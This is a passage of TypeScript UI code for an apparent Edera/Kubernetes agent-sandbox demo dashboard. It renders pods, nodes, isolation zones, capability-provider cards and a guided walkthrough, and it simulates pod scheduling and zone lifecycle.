            <div class="event-reason">
              ${escapeHtml(ev.reason)}
              <span class="event-object">
                (${escapeHtml(ev.object)})
              </span>
            </div>

            <div class="event-message">
              ${escapeHtml(ev.message)}
            </div>
          </div>
        `;
      })
      .join("");
  };

  const getNodeRoles = (node: LocalNode): string => {
    const roles: string[] = [];

    Object.keys(node.labels).forEach((label) => {
      if (label.startsWith("node-role.kubernetes.io/")) {
        const role = label.replace("node-role.kubernetes.io/", "");

        if (role) {
          roles.push(role);
        }
      }
    });

    return roles.length > 0 ? roles.join(",") : "<none>";
  };

  const formatLabels = (labels: Record<string, string>): string => {
    const entries = Object.entries(labels);

    if (entries.length === 0) {
      return "<none>";
    }

    return entries
      .map(([key, value]) => (value ? `${key}=${value}` : key))
      .join(",");
  };

  const renderPods = () => {
    podCount.innerText =
      `${pods.length} ${pods.length === 1 ? "Pod" : "Pods"}`;

    if (pods.length === 0) {
      podGrid.innerHTML = `
        <div class="empty-state">No pods running</div>
      `;
      applyPodGridLimit();
      return;
    }

    // Keep the reader's place in the list across re-renders.
    const previousScrollTop = podGrid.scrollTop;

    podGrid.innerHTML = pods
      .map((pod) => {
        const pending = pod.status === "Pending";
        const failed = pod.status === "Failed";
        const cardStateClass = failed
          ? "pending"
          : pending
            ? "pending"
            : "running";

        return `
          <div class="resource-card ${cardStateClass}">
            <div>
              <div class="resource-name">
                ${escapeHtml(pod.name)}
                <span style="color:#a8cfca;font-weight:400;font-size:10px;">
                  (${escapeHtml(pod.namespace)})
                </span>
              </div>

              <div class="resource-meta">
                ${escapeHtml(pod.image)} ·
                ${escapeHtml(pod.node || "unassigned")}
              </div>
            </div>

            <span class="status-badge ${
              failed || pending ? "status-pending" : "status-ready"
            }">
              ${escapeHtml(pod.status)}
            </span>
          </div>
        `;
      })
      .join("");

    applyPodGridLimit();
    podGrid.scrollTop = previousScrollTop;
  };

  // Show at most this many pod cards; the rest scroll inside the panel.
  const MAX_VISIBLE_POD_CARDS = 3;

  // Cap the pod list at MAX_VISIBLE_POD_CARDS cards, measured from the
  // rendered cards so the limit follows the real card height and gap.
  const applyPodGridLimit = () => {
    const cards = Array.from(podGrid.children) as HTMLElement[];

    if (cards.length <= MAX_VISIBLE_POD_CARDS) {
      podGrid.style.maxHeight = "";
      podGrid.style.overflowY = "";
      podGrid.style.paddingTop = "";
      podGrid.style.paddingRight = "";
      return;
    }

    const first = cards[0];
    const last = cards[MAX_VISIBLE_POD_CARDS - 1];
    const visibleHeight = last.offsetTop + last.offsetHeight - first.offsetTop;

    // The panel may be hidden (no layout yet). Leave the list uncapped and
    // let the ResizeObserver below re-measure once it becomes visible.
    if (visibleHeight <= 0) return;

    // +2px so the hover lift on the top card isn't clipped.
    podGrid.style.maxHeight = `${visibleHeight + 2}px`;
    podGrid.style.overflowY = "auto";
    podGrid.style.overscrollBehavior = "contain";
    podGrid.style.paddingTop = "2px";
    podGrid.style.paddingRight = "4px";
  };

  if (typeof ResizeObserver === "function") {
    // Re-measure when the panel is shown again or its width changes (cards
    // can wrap onto two lines on narrow layouts).
    new ResizeObserver(() => applyPodGridLimit()).observe(podsBodyForLimit);
  }

const renderNodes = () => {
  nodeCount.innerText =
    `${nodes.length} ${nodes.length === 1 ? "Node" : "Nodes"}`;

  if (nodes.length === 0) {
    nodeGrid.innerHTML = `
      <div class="empty-state">No nodes available</div>
    `;
    return;
  }

  nodeGrid.innerHTML = nodes
    .map((node) => {
      const usesEderaRuntime =
        node.labels.runtime === "edera";

      return `
        <div class="resource-card">
          <div>
            <div class="resource-name">
              <span>${escapeHtml(node.name)}</span>
            </div>

            <div class="resource-meta">
              ${escapeHtml(getNodeRoles(node))}
            </div>
          </div>

          <div
            style="
              display: flex;
              align-items: center;
              gap: 8px;
              flex-shrink: 0;
            "
          >
            ${
              usesEderaRuntime
                ? `
                  <span class="runtimeclass-badge">
                    runtimeClassName: edera
                  </span>
                `
                : ""
            }

            <span class="status-badge status-ready">
              ${escapeHtml(node.status)}
            </span>
          </div>
        </div>
      `;
    })
    .join("");
};
  const renderProtectZones = () => {
    zoneCount.innerText =
      `${protectZones.length} ${protectZones.length === 1 ? "Zone" : "Zones"}`;

    if (protectZones.length === 0) {
      zoneGrid.innerHTML = `
        <div class="empty-state">
          No Edera zones have been launched.
        </div>
      `;
      return;
    }
    zoneGrid.innerHTML = protectZones
      .map((zone) => {
        const workloadCount = protectWorkloads.filter(
          (workload) => workload.zone === zone.uuid,
        ).length;
        const statusClass =
          zone.state === "ready"
            ? "status-ready"
            : zone.state === "destroyed"
              ? "status-destroyed"
              : "status-pending";
        const isDestroyed = zone.state === "destroyed";
        return `
          <div class="zone-card${isDestroyed ? " zone-card-destroyed" : ""}">
            <div class="zone-top">
              <div>
                <div class="zone-name${isDestroyed ? " zone-name-destroyed" : ""}">
                  🛡️ ${escapeHtml(zone.name)}
                </div>

                <div class="zone-uuid">
                  ${escapeHtml(zone.uuid)}
                </div>
              </div>
              <span class="status-badge ${statusClass}">
                ${escapeHtml(zone.state)}
              </span>
            </div>
            <div class="zone-meta">
              <span>IPv4: ${escapeHtml(zone.ipv4 || "—")}</span>
              <span>CPUs: ${zone.targetCpus}</span>
              <span>Workloads: ${workloadCount}</span>
            </div>
          </div>
        `;
      })
      .join("");
  };
  const renderCapability = () => {
    // Capabilities only exist while a running workload publishes them;
    // destroying the workload (or its zone) removes them.
    const githubPublisher = protectWorkloads.find(
      (workload) =>
        workload.state === "running" &&
        workload.ocapPublished?.includes(OCAP_GITHUB_NAME),
    );
    const publishingZone = githubPublisher
      ? protectZones.find(
          (zone) => zone.uuid === githubPublisher.zone && zone.state === "ready",
        )
      : undefined;

    // Workload-published readme capability (README "Demo Workflow").
    const readmeProvider = protectWorkloads.find(
      (workload) =>
        workload.state === "running" &&
        workload.ocapPublishCommands?.[README_CAPABILITY],
    );
    if (!readmeProvider) {
      lastReadmeAction = "idle";
      lastReadmeRepo = "";
    }

    if (!publishingZone) {
      // A re-published capability starts fresh rather than showing the last
      // request made through a zone that no longer exists.
      lastOcapAction = "idle";
    }

    const clusterCard = renderClusterCapabilitiesCard();

    if (!publishingZone && !readmeProvider && !clusterCard) {
      capabilityCount.innerText = "0 Capabilities";
      capabilityGrid.innerHTML = `
        <div class="empty-state">
          No capabilities have been published in an Edera zone.
        </div>
      `;
      return;
    }

    const capabilityTotal =
      (publishingZone ? 1 : 0) + (readmeProvider ? 1 : 0) + clusterCapabilityCount();
    capabilityCount.innerText =
      capabilityTotal === 1 ? "1 Capability" : `${capabilityTotal} Capabilities`;

    const readmeCard =
      (readmeProvider ? renderReadmeCapabilityCard(readmeProvider) : "") + clusterCard;
    if (!publishingZone) {
      capabilityGrid.innerHTML = readmeCard;
      return;
    }

    const action =
      lastOcapAction === "allowed"
        ? {
            label: "ALLOWED",
            color: "#2f7d14",
          }
        : lastOcapAction === "denied"
          ? {
              label: "DENIED",
              color: "#b42318",
            }
          : lastOcapAction === "credential-blocked"
            ? {
                label: "CREDENTIAL OUTSIDE SANDBOX",
                color: "#007a70",
              }
            : {
                label: "READY",
                color: "#276b63",
              };

    capabilityGrid.innerHTML = `
      <div
        class="capability-card"
        style="
          display:grid;
          grid-template-columns:minmax(180px,1.05fr) minmax(260px,1.6fr) minmax(220px,1fr);
          gap:14px;
          align-items:center;
          min-height:72px;
          padding:10px 14px;
          border:1px solid rgba(13,63,57,.12);
          border-radius:14px;
          background:#f5fbf9;
          color:#163c38;
          opacity:1;
          box-sizing:border-box;
        "
      >
        <div>
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:3px;">
            <div style="font-size:16px;font-weight:800;color:#102f2c;">github</div>
            <span style="font-size:10px;font-weight:800;letter-spacing:.08em;color:${action.color};">${action.label}</span>
          </div>
          <div style="font-size:11px;color:#4b6864;line-height:1.3;">
            Git over HTTPS to <strong style="color:#173f3a;">github.com</strong>
          </div>
        </div>

        <div class="capability-rules" style="display:grid;gap:5px;font-size:11px;min-width:0;">
          <div style="display:flex;gap:8px;align-items:center;min-width:0;">
            <span style="min-width:46px;padding:3px 6px;border-radius:5px;background:rgba(118,190,28,.14);color:#3e7f0e;font-weight:800;text-align:center;">GET</span>
            <code class="capability-target" style="color:#244e49;overflow-wrap:anywhere;">github.com/kubernetes/kubernetes.git</code>
          </div>
          <div style="display:flex;gap:8px;align-items:center;min-width:0;">
            <span style="min-width:46px;padding:3px 6px;border-radius:5px;background:rgba(118,190,28,.14);color:#3e7f0e;font-weight:800;text-align:center;">POST</span>
            <code class="capability-target" style="color:#244e49;overflow-wrap:anywhere;">github.com/kubernetes/kubernetes.git</code>
          </div>
          <div style="color:#b42318;font-weight:700;">✕ Everything else is denied</div>
        </div>

        <div style="font-size:11px;color:#4b6864;line-height:1.25;">
          <strong style="color:#315b55;">🔐 Bounded Zone:</strong>
          <code style="color:#244e49;overflow-wrap:anywhere;">${escapeHtml(publishingZone.name)}</code>
        </div>
      </div>
    ` + readmeCard;
  };

  // CapabilityProviders in the cluster: each one's capabilities, which of
  // them templates grant, and the sessions consuming them.
  const clusterCapabilityCount = () =>
    [...capabilityProviders.values()].reduce(
      (total, state) => total + Object.keys(state.provider?.publishes || {}).length,
      0,
    );
  const renderClusterCapabilitiesCard = (): string => {
    if (capabilityProviders.size === 0) return "";
    const rows = [...capabilityProviders.keys()]
      .sort()
      .map((providerName) => {
        const state = capabilityProviders.get(providerName)!;
        const pod = pods.find((item) => item.name === state.podName);
        const running = pod?.status === "Running";
        const chips = Object.keys(state.provider?.publishes || {})
          .map((cap) => {
            const consumers = sessionsUsing(providerName, cap);
            const granted = templatesGranting(providerName, cap).length > 0;
            const label = consumers.length ? "BOUND" : granted ? "GRANTED" : "NOT GRANTED";
            const color = consumers.length ? "#2f7d14" : granted ? "#276b63" : "#8a6d1a";
            return `
              <div style="display:flex;gap:8px;align-items:center;min-width:0;">
                <code style="color:#244e49;overflow-wrap:anywhere;">${escapeHtml(cap)}</code>
                <span style="font-size:9px;font-weight:800;letter-spacing:.08em;color:${color};">${label}</span>
                ${consumers.length ? `<span style="color:#4b6864;">→ <code style="color:#244e49;">${escapeHtml(consumers.join(", "))}</code></span>` : ""}
              </div>`;
          })
          .join("");
        return `
          <div style="display:grid;grid-template-columns:minmax(120px,.7fr) minmax(220px,1.6fr) minmax(120px,.8fr);gap:10px;align-items:start;font-size:11px;padding:6px 0;border-top:1px solid rgba(13,63,57,.08);">
            <div>
              <code style="font-weight:800;color:#102f2c;">${escapeHtml(providerName)}</code>
              <div style="font-size:10px;font-weight:800;letter-spacing:.08em;color:${running ? "#2f7d14" : "#8a6d1a"};">${running ? "PROVIDING" : "STARTING"}</div>
            </div>
            <div style="display:grid;gap:3px;min-width:0;">${chips}</div>
            <span style="color:#4b6864;overflow-wrap:anywhere;">Templates: ${escapeHtml(templatesGranting(providerName).join(", ") || "—")}</span>
          </div>`;
      })
      .join("");
    return `
      <div
        class="capability-card"
        style="padding:10px 14px;margin-top:10px;border:1px solid rgba(13,63,57,.12);border-radius:14px;background:#f5fbf9;color:#163c38;box-sizing:border-box;"
      >
        <div style="display:flex;align-items:baseline;gap:10px;margin-bottom:6px;">
          <div style="font-size:14px;font-weight:800;color:#102f2c;">Capability providers</div>
          <span style="font-size:11px;color:#4b6864;">capabilityproviders.runtime.edera.dev · credentials stay with each provider</span>
        </div>
        ${rows}
      </div>
    `;
  };


  const renderReadmeCapabilityCard = (provider: ProtectWorkload): string => {
    const zone = protectZones.find((item) => item.uuid === provider.zone);
    const command = provider.ocapPublishCommands?.[README_CAPABILITY]?.join(" ") || "";
    const tokenMount = provider.mounts?.find(
      (mount) => mount.destination === README_TOKEN_MOUNT_PATH,
    );
    const action =
      lastReadmeAction === "allowed"
        ? { label: "ALLOWED", color: "#2f7d14" }
        : lastReadmeAction === "denied"
          ? { label: "DENIED", color: "#b42318" }
          : lastReadmeAction === "error"
            ? { label: "FAILED", color: "#b54708" }
            : { label: "READY", color: "#276b63" };

    return `
      <div
        class="capability-card"
        style="
          display:grid;
          grid-template-columns:minmax(180px,1.05fr) minmax(260px,1.6fr) minmax(220px,1fr);
          gap:14px;
          align-items:center;
          min-height:72px;
          padding:10px 14px;
          margin-top:10px;
          border:1px solid rgba(13,63,57,.12);
          border-radius:14px;
          background:#f5fbf9;
          color:#163c38;
          box-sizing:border-box;
        "
      >
        <div>
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:3px;">
            <div style="font-size:16px;font-weight:800;color:#102f2c;">${escapeHtml(README_CAPABILITY)}</div>
            <span style="font-size:10px;font-weight:800;letter-spacing:.08em;color:${action.color};">${action.label}</span>
          </div>
          <div style="font-size:11px;color:#4b6864;line-height:1.3;">
            Published by workload <strong style="color:#173f3a;">${escapeHtml(provider.name)}</strong>
            (${readmeLanguageForImage(provider.image)})
          </div>
        </div>

        <div class="capability-rules" style="display:grid;gap:5px;font-size:11px;min-width:0;">
          <div style="display:flex;gap:8px;align-items:center;min-width:0;">
            <span style="min-width:46px;padding:3px 6px;border-radius:5px;background:rgba(118,190,28,.14);color:#3e7f0e;font-weight:800;text-align:center;">RUN</span>
            <code class="capability-target" style="color:#244e49;overflow-wrap:anywhere;">${escapeHtml(command)} &lt;repo&gt;</code>
          </div>
          ${
            lastReadmeRepo
              ? `<div style="color:#4b6864;">Last dial: <code style="color:#244e49;overflow-wrap:anywhere;">${escapeHtml(lastReadmeRepo)}</code></div>`
              : ""
          }
          <div style="color:#b42318;font-weight:700;">✕ Callers choose the argument, not the command</div>
        </div>

        <div style="font-size:11px;color:#4b6864;line-height:1.25;">
          <strong style="color:#315b55;">🔐 Token:</strong>
          <code style="color:#244e49;overflow-wrap:anywhere;">${
            tokenMount ? `${escapeHtml(tokenMount.destination)} (provider only)` : "not mounted"
          }</code><br/>
          <strong style="color:#315b55;">Zone:</strong>
          <code style="color:#244e49;overflow-wrap:anywhere;">${escapeHtml(zone?.name || "—")}</code>
        </div>
      </div>
    `;
  };

  const updateDashboard = () => {
    renderPods();
    renderNodes();
    renderProtectZones();
    renderCapability();
  };
  let selectedDemoStepIndex: number | null = null;
  // The guide is dedicated to the Agent Sandbox + Edera runtime workflow.
  let activeDemoMode: "agent-sandbox" = "agent-sandbox";
  let activeDemoSteps: DemoStep[] = AGENT_SANDBOX_DEMO_STEPS;
  const getNextDemoStepIndex = (): number => {
    const index = activeDemoSteps.findIndex(
      (step) => !completedDemoSteps.has(step.id),
    );
    return index === -1 ? activeDemoSteps.length - 1 : index;
  };
  const getSelectedDemoStepIndex = (): number => {
    if (
      selectedDemoStepIndex !== null &&
      selectedDemoStepIndex >= 0 &&
      selectedDemoStepIndex < activeDemoSteps.length
    ) {
      return selectedDemoStepIndex;
    }
    return getNextDemoStepIndex();
  };
  const selectDemoStep = (index: number) => {
    if (index < 0 || index >= activeDemoSteps.length) {
      return;
    }
    selectedDemoStepIndex = index;
    renderGuide();
  };
  const renderGuide = () => {
    const currentIndex = getSelectedDemoStepIndex();
    const currentStep = activeDemoSteps[currentIndex];
    guideProgress.innerHTML = activeDemoSteps.map((step, index) => {
      const done = completedDemoSteps.has(step.id);
      const current = index === currentIndex && !done;
      return `
        <span
          class="progress-dot ${
            done ? "done" : current ? "current" : ""
          }"
          title="${escapeHtml(step.title)}"
        ></span>
      `;
    }).join("");
    guideStepTitle.innerHTML =
      `${escapeHtml(currentStep.title)}${
        currentStep.optional
          ? `<span class="optional-badge">OPTIONAL</span>`
          : ""
      }`;
    guideDescription.innerHTML = currentStep.description;
    suggestedCommand.innerText = currentStep.command;
    guideStepList.innerHTML = activeDemoSteps.map((step, index) => {
      const done = completedDemoSteps.has(step.id);
      const current = index === currentIndex && !done;
      const selected = index === currentIndex;
      return `
        <button
          type="button"
          class="guide-step-mini ${
            done ? "done" : current ? "current" : ""
          } ${selected ? "selected" : ""}"
          data-step-index="${index}"
          title="${escapeHtml(step.title)} — click to select this task"
        >
          <span class="mini-number">${index + 1}.</span>
          <span>
            ${escapeHtml(step.title)}
            ${
              step.optional
                ? `<span class="optional-badge">optional</span>`
                : ""
            }
          </span>
        </button>
      `;
    }).join("");
    fitGuideStepList(currentIndex);
  };

  // Cap the demo flow at GUIDE_VISIBLE_STEPS rows and keep the selected step
  // in view with a little context above it, so users see where they've been
  // and what's next without all the steps at once.
  const GUIDE_VISIBLE_STEPS = 10;
  const GUIDE_STEPS_ABOVE_CURRENT = 2;
  let lastScrolledGuideIndex: number | null = null;

  const fitGuideStepList = (currentIndex: number) => {
    const rows = guideStepList.querySelectorAll<HTMLElement>(".guide-step-mini");
    if (rows.length === 0 || guideStepList.offsetParent === null) {
      return;
    }

    const limitRow = rows[Math.min(GUIDE_VISIBLE_STEPS, rows.length) - 1];
    const listTop = rows[0].offsetTop;
    guideStepList.style.maxHeight =
      `${limitRow.offsetTop + limitRow.offsetHeight - listTop}px`;

    // Only auto-scroll when the selected step changes, so a user browsing
    // ahead isn't yanked back on every re-render.
    if (currentIndex === lastScrolledGuideIndex) {
      return;
    }
    lastScrolledGuideIndex = currentIndex;
    const anchor = rows[Math.max(0, currentIndex - GUIDE_STEPS_ABOVE_CURRENT)];
    guideStepList.scrollTop = anchor.offsetTop - listTop;
  };

  window.addEventListener("resize", () => {
    lastScrolledGuideIndex = null;
    fitGuideStepList(getSelectedDemoStepIndex());
  });

  const markDemoStepComplete = (stepId: string) => {
    const wasComplete = isDemoComplete();
    completedDemoSteps.add(stepId);
    const selectedStep =
      selectedDemoStepIndex === null
        ? undefined
        : activeDemoSteps[selectedDemoStepIndex];
    if (selectedStep === undefined || selectedStep.id === stepId) {
      const nextIndex = activeDemoSteps.findIndex(
        (step) => !completedDemoSteps.has(step.id),
      );
      selectedDemoStepIndex =
        nextIndex === -1 ? activeDemoSteps.length - 1 : nextIndex;
    }
    renderGuide();
    // The Agent Sandbox walkthrough is the only guide and owns the completion modal.
    if (activeDemoMode === "agent-sandbox" && !wasComplete && isDemoComplete()) {
      requestAnimationFrame(() => {
        showCompletionModal();
      });
    }
  };
  guideStepList.addEventListener("click", (event) => {
    const target = event.target as HTMLElement;
    const button = target.closest<HTMLButtonElement>("button[data-step-index]");

    if (!button) {
      return;
    }
    const index = Number(button.dataset.stepIndex);
    if (Number.isFinite(index)) {
      selectDemoStep(index);
    }
  });
  useCommandBtn.addEventListener("click", () => {
    const index = getSelectedDemoStepIndex();
    const step = activeDemoSteps[index];
    input.value = step.command;
    input.focus();
    input.setSelectionRange(input.value.length, input.value.length);
  });
  document
    .querySelector<HTMLButtonElement>("#hero-run-btn")!
    .addEventListener("click", () => {
      document
        .querySelector<HTMLElement>("#guide-panel")!
        .scrollIntoView({ behavior: "smooth", block: "start" });

      input.focus();
    });
  const hidePanel = (
    panelId: string,
    bodyId: string,
    buttonId: string,
  ) => {
    const panel = document.querySelector<HTMLElement>(panelId)!;
    const body = document.querySelector<HTMLElement>(bodyId)!;
    const button = document.querySelector<HTMLButtonElement>(buttonId)!;
    let hidden = false;
    button.addEventListener("click", () => {
      hidden = !hidden;
      body.style.display = hidden ? "none" : "";
      button.innerText = hidden ? "Show" : "Hide";
      if (hidden) {
        panel.style.opacity = "0.65";
      } else {
        panel.style.opacity = "1";
      }
    });
  };
  hidePanel("#pods-panel", "#pods-body", "#hide-pods-btn");
  hidePanel("#nodes-panel", "#nodes-body", "#hide-nodes-btn");
  hidePanel("#capabilities-panel", "#capabilities-body", "#hide-capabilities-btn");
  hidePanel("#protect-panel", "#protect-body", "#hide-protect-btn");
  hidePanel("#guide-panel", "#guide-body", "#hide-guide-btn");
  document
    .querySelector<HTMLButtonElement>("#hide-events-btn")!
    .addEventListener("click", () => {
      const eventsPanel =
        document.querySelector<HTMLElement>("#events-panel")!;

      const stream =
        document.querySelector<HTMLElement>("#events-stream")!;

      const button =
        document.querySelector<HTMLButtonElement>("#hide-events-btn")!;

      const hidden = stream.style.display === "none";

      stream.style.display = hidden ? "" : "none";
      button.innerText = hidden ? "Hide" : "Show";
      eventsPanel.style.opacity = hidden ? "1" : "0.65";
    });

  document
    .querySelector<HTMLButtonElement>("#clear-events-btn")!
    .addEventListener("click", () => {
      clusterEvents = [];
      renderEvents();
    });
  const findSchedulableNode = (pod: LocalPod): LocalNode | undefined => {
    const effectiveNodeSelector: Record<string, string> = {
      ...(pod.nodeSelector || {}),
    };
    if (pod.runtimeClassName === "edera") {
      effectiveNodeSelector.runtime = "edera";
    }
    const selectorEntries = Object.entries(effectiveNodeSelector);
    if (selectorEntries.length > 0) {
      return nodes.find((node) =>
        node.status === "Ready" &&
        selectorEntries.every(
          ([key, value]) => node.labels[key] === value,
        ),
      );
    }
    return (
      nodes.find(
        (node) =>
          node.status === "Ready" &&
          !node.labels["node-role.kubernetes.io/control-plane"],
      ) || nodes.find((node) => node.status === "Ready")
    );
  };
  const checkPendingPods = () => {
    for (const pod of pods) {
      const recoverableRuntimeClassPod =
        pod.status === "Failed" &&
        pod.runtimeClassName &&
        activeRuntimeClasses.has(pod.runtimeClassName);
      if (pod.status !== "Pending" && !recoverableRuntimeClassPod) {
        continue;
      }
      if (
        pod.runtimeClassName &&
        !activeRuntimeClasses.has(pod.runtimeClassName)
      ) {
        continue;
      }
      if (pod.ownerDeployment) {
        const deployment = deployments.find((item) => item.name === pod.ownerDeployment);
        if (deployment?.volumeClaimName && deployment.volumeMode && !storageReadyForDeployment(deployment.volumeClaimName, deployment.volumeMode)) {
          continue;
        }
      }
      if (recoverableRuntimeClassPod) {
        pod.status = "Pending";
        addEvent(
          "Info",
          "RuntimeClassRecovered",
          `pod/${pod.name}`,
          `RuntimeClass "${pod.runtimeClassName}" is available again; attempting to reschedule ${pod.name}`,
        );
      }

      const targetNode = findSchedulableNode(pod);

      if (!targetNode) {
        continue;
      }

      pod.status = "Running";
      pod.node = targetNode.name;
      pod.ip = `10.244.0.${Math.floor(Math.random() * 200 + 10)}`;

      addEvent(
        "Normal",
        "Scheduled",
        `pod/${pod.name}`,
        `Successfully assigned ${pod.namespace}/${pod.name} to ${targetNode.name}`,
      );

      addEvent(
        "Normal",
        "Started",
        `pod/${pod.name}`,
        `Started container ${pod.name}`,
      );
    }

    syncEderaPodsToProtectWorkloads();
    for (const deployment of deployments) {
      deployment.readyReplicas = pods.filter(
        (pod) =>
          pod.ownerDeployment === deployment.name &&
          pod.status === "Running",
      ).length;
    }

    updateDashboard();
  };

  const reconcileDeployments = () => {
    for (const deployment of deployments) {
      const managedPods = pods.filter(
        (pod) =>
          pod.ownerDeployment === deployment.name &&
          pod.status !== "Failed",
      );

      while (managedPods.length < deployment.replicas) {
        const podName = `${deployment.name}-${Math.random()
          .toString(36)
          .slice(2, 7)}`;

        const runtimeReady = deployment.runtimeClassName
          ? activeRuntimeClasses.has(deployment.runtimeClassName)
          : true;

        const pod: LocalPod = {
          name: podName,
          namespace: deployment.namespace,
          status: "Pending",
          age: "1s",
          image: deployment.image,
          ip: "<none>",
          node: "<none>",
          labels: { app: "nginx" },
          runtimeClassName: deployment.runtimeClassName,
          ownerDeployment: deployment.name,
        };

        pods.push(pod);
        managedPods.push(pod);

        addEvent(
          "Normal",
          "Created",
          `pod/${pod.name}`,
          `Created replacement pod ${pod.name} for Deployment ${deployment.name}`,
        );

        if (!runtimeReady) {
          addEvent(
            "Warning",
            "FailedCreatePodSandBox",
            `pod/${pod.name}`,
            `Waiting for RuntimeClass "${deployment.runtimeClassName || ""}" to become available`,
          );
        }
      }

      checkPendingPods();
    }

    syncEderaPodsToProtectWorkloads();
    updateDashboard();
  };
  const nextZoneIp = () => {
    const used = new Set(
      protectZones
        .map((zone) => zone.ipv4)
        .filter(Boolean)
        .map((ip) => ip.split(".")[3]?.split("/")[0]),
    );

    for (let i = 2; i < 250; i++) {
      if (!used.has(String(i))) {
        return `10.75.0.${i}/16`;
      }
    }
    return `10.75.0.${Math.floor(Math.random() * 200 + 20)}/16`;
  };

  const nextZoneIpv6 = () => {
    const id = protectZones.length + 2;

    return `fdd4:1476:6c7e::${id}/48`;
  };

  const launchProtectZone = (
    name: string,
    minCpus = 1,
    maxCpus = 2,
    targetCpus = 2,
    device?: string,
    kernelVariant?: string,
  ) => {
    const uuid = crypto.randomUUID();
    const zone: ProtectZone = {
      name,
      uuid,
      state: "creating",
      ipv4: "",
      ipv6: "",
      minCpus,
      maxCpus,
      targetCpus,
      device,
      kernelVariant,
    };
    protectZones.push(zone);
    addEvent(
      "Info",
      "ZoneCreating",
      `zone/${name}`,
      `Requested Edera zone ${name}`,
    );
    zone.state = "ready";
    zone.ipv4 = nextZoneIp();
    zone.ipv6 = nextZoneIpv6();
    addEvent(
      "Normal",
      "ZoneReady",
      `zone/${name}`,
      `Edera zone ${name} is ready`,
    );
    syncEderaPodsToProtectWorkloads();
    updateDashboard();
    printHtml(
      `<span style="color:#b8ff3c;">${escapeHtml(uuid)}</span>`,
    );
  };
  const renderProtectZoneList = (zones = protectZones) => {
    if (zones.length === 0) {
      printHtml(
        `<span style="color:#a8cfca;">No zones have been launched.</span>`,
      );
      return;
    }
    // Widen the NAME column for long zone names (e.g. fork pods).
    const nameWidth = Math.max(15, ...zones.map((zone) => zone.name.length + 2));
    const uuidWidth = 38;
    const stateWidth = 13;
    const ipv4Width = 18;
    const ipv6Width = 28;
    const header =
      "NAME".padEnd(nameWidth) +
      "UUID".padEnd(uuidWidth) +
      "STATE".padEnd(stateWidth) +
      "IPV4".padEnd(ipv4Width) +
      "IPV6";
    const divider =
      "─".repeat(nameWidth) +
      "─".repeat(uuidWidth) +
      "─".repeat(stateWidth) +
      "─".repeat(ipv4Width) +
      "─".repeat(ipv6Width);

    let html = `<span style="color:#00e5d4;font-weight:700;">${header}</span>\n`;
    html += `<span style="color:#08736d;">${divider}</span>\n`;

    for (const zone of zones) {
      const stateColor =
        zone.state === "ready"
          ? "#b8ff3c"
          : zone.state === "destroyed"
            ? "#a8cfca"
            : "#ffd166";

      html +=
        `${escapeHtml(zone.name.padEnd(nameWidth))}` +
        `${escapeHtml(zone.uuid.padEnd(uuidWidth))}` +
        `<span style="color:${stateColor};">${escapeHtml(
          zone.state.padEnd(stateWidth),
        )}</span>` +
        `${escapeHtml((zone.ipv4 || "").padEnd(ipv4Width))}` +
        `${escapeHtml(zone.ipv6 || "")}` +
        "\n";
    }

    printPre(html.trimEnd());
  };

  const destroyProtectZoneInstance = (zone: ProtectZone, wait = false) => {
    if (zone.state === "destroyed") {
      return false;
    }

    zone.state = "destroying";

    addEvent(
      "Info",
      "ZoneDestroying",
      `zone/${zone.name}`,
      `Destruction requested for zone ${zone.name}`,
    );

    const attached = protectWorkloads.filter(
      (workload) => workload.zone === zone.uuid,
    );

    for (const workload of attached) {
      addEvent(
        "Normal",
        "WorkloadTerminated",
        `workload/${workload.name}`,
        `Workload ${workload.name} removed with zone ${zone.name}`,
      );
    }
    removePodsForProtectWorkloads(attached.map((workload) => workload.uuid));

    protectWorkloads = protectWorkloads.filter(
      (workload) => workload.zone !== zone.uuid,
    );

    zone.state = "destroyed";
    zone.ipv4 = "";
    zone.ipv6 = "";

    addEvent(
      "Normal",
      "ZoneDestroyed",
      `zone/${zone.name}`,
      `Zone ${zone.name} destroyed`,
    );

    printHtml(
      `<span style="color:#dff7f0;">Destruction of zone ${escapeHtml(
        zone.uuid,
      )} ${wait ? "completed" : "requested"}.</span>`,
    );

    return true;
  };

  const normalizeZoneSelector = (selector: string): string | null => {
    const match = selector.trim().match(/^status\.state\s*=\s*([^\s]+)$/i);
    if (!match) {
      return null;
    }

    const rawState = match[1].toLowerCase();
    const normalized = rawState.startsWith("zone_state_")
      ? rawState.slice("zone_state_".length)
      : rawState;

    const supportedStates = new Set([
      "creating",
      "created",
      "ready",
      "exited",
      "destroying",
      "destroyed",
      "failed",
    ]);

    return supportedStates.has(normalized) ? normalized : null;
  };

  const destroyProtectZones = (
    identifier: string,
    all = false,
    wait = false,
    selector?: string,
  ) => {
    const normalizedSelector = selector
      ? normalizeZoneSelector(selector)
      : undefined;

    if (selector && !normalizedSelector) {
      printHtml(
        `<span style="color:#ff7373;">Invalid selector "${escapeHtml(
          selector,
        )}". Supported form: status.state=&lt;STATE&gt;.</span>`,
      );
      return;
    }

    let matches = protectZones.filter((zone) => {
      if (zone.state === "destroyed") {
        return false;
      }

      const identifierMatches =
        zone.uuid === identifier || zone.name === identifier;
      if (!identifierMatches) {
        return false;
      }

      if (!normalizedSelector) {
        return true;
      }

      const state = normalizedSelector === "created"
        ? "ready"
        : normalizedSelector;

      return zone.state === state;
    });

    if (!all && matches.length > 1) {
      matches = [matches[matches.length - 1]];
    }

    if (matches.length === 0) {
      printHtml(
        `<span style="color:#a8cfca;">No active zones matched "${escapeHtml(
          identifier,
        )}".</span>`,
      );
      return;
    }

    let destroyedCount = 0;
    for (const zone of matches) {
      if (destroyProtectZoneInstance(zone, wait)) {
        destroyedCount += 1;
      }
    }

    if (all && destroyedCount > 1) {
      printHtml(
        `<span style="color:#b8ff3c;">Destroyed ${destroyedCount} zones matching "${escapeHtml(
          identifier,
        )}".</span>`,
      );
    }

    updateDashboard();
  };

  // Workloads launched through the Protect CLI show up as pods in the
  // default namespace, so `kubectl get pods` reflects what's running.
  const nextWorkloadPodIp = () => {
    const used = new Set(pods.map((pod) => pod.ip));
    for (let i = 30; i < 250; i++) {
      const ip = `10.244.0.${i}`;
      if (!used.has(ip)) return ip;
    }
    return "10.244.0.250";
  };

  const createPodForProtectWorkload = (workload: ProtectWorkload) => {
    if (pods.some((pod) => pod.namespace === "default" && pod.name === workload.name)) {
      return;
    }
    pods.push({
      name: workload.name,
      namespace: "default",
      status: "Running",
      age: "0s",
      image: workload.image,
      ip: nextWorkloadPodIp(),
      node: "node-2",
      labels: { app: workload.name },
      runtimeClassName: "edera",
      ownerProtectWorkload: workload.uuid,
    });
